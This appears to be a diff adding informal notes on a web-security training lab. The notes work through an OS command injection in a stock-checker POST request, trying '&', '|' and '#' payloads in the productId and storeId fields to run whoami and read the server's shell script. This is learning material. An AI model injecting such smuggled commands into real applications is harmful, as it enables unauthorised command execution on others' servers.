@@ -1,0 +1,46 @@
+Lab: OS command injection, simple case
+
+
+ This lab contains an OS command injection vulnerability in the product stock checker.
+
+The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
+
+To solve the lab, execute the whoami command to determine the name of the current user. 
+
+we have 
+
+POST /product/stock HTTP/1.1
+
+with
+
+productId=2&storeId=1
+
+
+lets try with
+
+& echo asdasdas & didnt work,
+
+lets try with |
+ works
+
+ or u need to use ctrl u to put %26 instead of &
+
+ whoami: extra operand '1'
+Try 'whoami --help' for more information.
+/home/peter-EPbHDb/stockreport.sh: line 5: $2: unbound variable
+
+lets try to comment the storedID
+
+using  #
+ctrl u  +%23 important th "+"
+
+
+u can try to cat /home/peter-EPbHDb/stockreport.sh
+
+to see the bash command
+
+#!/bin/bash
+
+set -eu
+
+eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
